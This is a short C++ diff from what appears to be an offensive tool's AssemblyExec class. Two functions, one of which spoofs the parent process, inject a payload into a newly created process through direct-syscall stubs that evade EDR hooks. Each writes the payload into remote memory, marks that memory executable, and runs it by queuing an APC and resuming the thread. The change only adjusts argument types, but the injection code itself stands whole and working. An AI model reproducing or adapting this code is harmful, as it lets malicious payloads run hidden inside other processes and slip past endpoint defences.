@@ -692,13 +692,14 @@ int AssemblyExec::createNewProcessWithSpoofedParent(const std::string& payload, 
 
 		Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+		SIZE_T NumberOfBytesWritten;
+		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), &NumberOfBytesWritten);
 		
 		ULONG oldAccess;
 		Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
 
-		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
-		Sw3NtResumeThread_(piProcInfo.hThread, NULL);
+		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, (PIO_STATUS_BLOCK)NULL, NULL);
+		Sw3NtResumeThread_(piProcInfo.hThread, (PULONG)NULL);
 	}
 	else
 	{
@@ -837,13 +838,14 @@ int AssemblyExec::createNewProcess(const std::string& payload, const std::string
 
 		Sw3NtAllocateVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, 0, &sizeToAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), 0);
+		SIZE_T NumberOfBytesWritten;
+		Sw3NtWriteVirtualMemory_(piProcInfo.hProcess, remoteBuffer, (PVOID)payload.data(), payload.size(), &NumberOfBytesWritten);
 		
 		ULONG oldAccess;
 		Sw3NtProtectVirtualMemory_(piProcInfo.hProcess, &remoteBuffer, &sizeToAlloc, PAGE_EXECUTE_READ, &oldAccess);
 
-		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, NULL, NULL);
-		Sw3NtResumeThread_(piProcInfo.hThread, NULL);
+		Sw3NtQueueApcThread_(piProcInfo.hThread, (PIO_APC_ROUTINE)remoteBuffer, remoteBuffer, (PIO_STATUS_BLOCK)NULL, NULL);
+		Sw3NtResumeThread_(piProcInfo.hThread, (PULONG)NULL);
 	}
 	else
 	{
